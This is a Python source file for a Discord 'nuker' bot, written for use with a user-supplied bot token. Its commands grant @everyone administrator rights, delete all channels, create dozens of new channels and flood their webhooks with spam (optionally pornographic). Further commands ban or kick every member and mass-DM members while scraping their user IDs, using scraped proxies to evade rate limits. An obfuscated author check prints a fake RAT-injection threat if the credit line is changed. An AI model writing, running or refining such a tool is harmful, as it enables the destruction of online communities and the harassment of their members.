import asyncio
import discord
from discord import Permissions
from discord.ext import commands
from util.proxies import proxy_scrape, proxy
from time import sleep
import os
from random import randint
import random
import threading
import time
import requests
from pystyle import *
import sys

__author__ = 'K.Dot#0001'

#===================CONFIG===================#

TOKEN = '' #ur BOT token here
CHANNEL_NAMES = 'K.Dot#0001' #name of the created channels
MESSAGE = '@everyone K.Dot#0001 was here! ' #message u want ALSO make sure there is a space at the end if your using spam_prn
PREFIX = 'god ' #ur prefix
AMMOUNT_OF_CHANNELS = 60 #lol you can go more if u got a good pc
SERVER_NAME = 'KDot better' #mad facts cuz
SPAM_PRN = True #hehehehehehehehehehe
PROXIES = True #no proxies is a LOT faster but u can get ratelimited faster sometimes so its up to u ALSO PROXIES WILL MESS UP CONSOLE LMAO
LESS_RATE_LIMIT = False #TURN TO TRUE IF YOU WANT TO GET RATE LIMITED LESS. PROXIES IS STILL BETTER THO

#===================CONFIG===================#

banner = Center.XCenter("""
 ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 Made by Godfather and K.Dot#0001\n\n
""")


intents = discord.Intents.all() #enable all intents cause why not
client = commands.Bot(command_prefix=PREFIX, intents=intents) #I fucking love intents
client.remove_command('help') #help can smd

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name='K.Dot#0001'))
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("title " + "Nuking with K.Dot#0001")
    print(Colorate.Vertical(Colors.purple_to_red, banner, 2))
    print(Colors.green + f"READY FOR NUKING\n\nSAY '{PREFIX}help' FOR HELP\n")


@client.command()
async def nuke(ctx):
    try:
        await ctx.message.delete()
        await ctx.guild.edit(name=str(SERVER_NAME))
        try:
            role = discord.utils.get(ctx.guild.roles, name = "@everyone")
            await role.edit(permissions = Permissions.all())
        except:
            print("couldn't give everyone admin")
        #for role in ctx.guild.roles:
        #    try:
        #        await role.delete()
        #        print(f"{role} got fucked") #this is a bit buggy
        #    except:
        #        print(f"couldn't delete {role}")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print("a")
        for i in range(AMMOUNT_OF_CHANNELS):
            try:
                kdot = await ctx.guild.create_text_channel(name='K.Dot#0001')
                webhook = await kdot.create_webhook(name='K.Dot#0001')
                threading.Thread(target=spamhook, args=(webhook.url,)).start()
            except:
                print('There was an error while creating channels')
    except:
        print("b")

@client.command()
async def massdm(ctx):
    await ctx.message.delete() #aint nobody wanna see ur message
    for user in ctx.guild.members: #for every member in the server
        try: #just try it 
            #num = randint(1, 2) #makes disocrd not lick ur weiner (sometimes)
            await user.send(MESSAGE) #sends dm
            #asyncio.wait(num) #wait for num seconds
            print(f"Dm'd {user.name}") #print who we dm
            with open ('scrape.txt', 'a') as f: #open scrape.txt
                f.write(str(user.id) + '\n') #write user id to scrape.txt
        except: #if it fails
            print(f"Couldn't dm {user.name}") #no dm 4 u

@client.command()
async def ban_all(ctx): #will rate limit the bot
    try:
        for member in ctx.guild.members:
            try:
                await member.ban(reason= 'Banned by K.Dot#0001')
                print(f'Banned {member.name}')
                asyncio.wait(.5)
            except:
                print(f'Failed to ban {member.name}')
    except:
        print('No more people to ban!')

@client.command()
async def kick_all(ctx): #will rate limit the bot
    try:
        for member in ctx.guild.members:
            await member.kick(reason= 'Kicked by K.Dot#0001')
            print(f'Kicked {member.name}')
            asyncio.wait(.5)
    except:
        print(f'Failed to kick {member.name}')
        
@client.command()
async def help(ctx):
    embedVar = discord.Embed(title="Help Menu!", color=0x00ff00)
    embedVar.set_thumbnail(url='https://cdn.discordapp.com/attachments/996976015970676910/1012856993561718795/damn_cover.jpg?size=4096')
    embedVar.add_field(name="Instructions", value=f'''
Different Help commands

{PREFIX} nuke
{PREFIX} ban_all
{PREFIX} kick_all
{PREFIX} massdm

''', inline=True)
    embedVar.set_footer(text = 'Made by K.Dot#0001')
    await ctx.send(embed=embedVar)

def spamhookp(hook):
    for i in range(5):
        for i in range(4):
            if SPAM_PRN == True:
                try:
                    requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))}, proxies=proxy())
                except:
                    print(f'error spamming! {hook}')
            else:
                try:
                    requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
                except:
                    print(f'error spamming! {hook}')
            if LESS_RATE_LIMIT == False:
                continue
            else:
                time.sleep(0.5)
    sys.exit()
        
def spamhook(hook):
    for i in range(5):
        for i in range(4):
            if SPAM_PRN == True:
                try:
                    requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))})
                except:
                    print(f'error spamming! {hook}')
            else:
                try:
                    requests.post(hook, data={'content': MESSAGE})
                except:
                    print(f'error spamming! {hook}')
            if LESS_RATE_LIMIT == False:
                continue
            else:
                time.sleep(0.5)
    sys.exit()

if PROXIES == True:
    proxy_scrape()

if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
    print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
    time.sleep(5)
    os._exit(0)

try:
    client.run(TOKEN)
except:
    print('Invalid Token or other error')
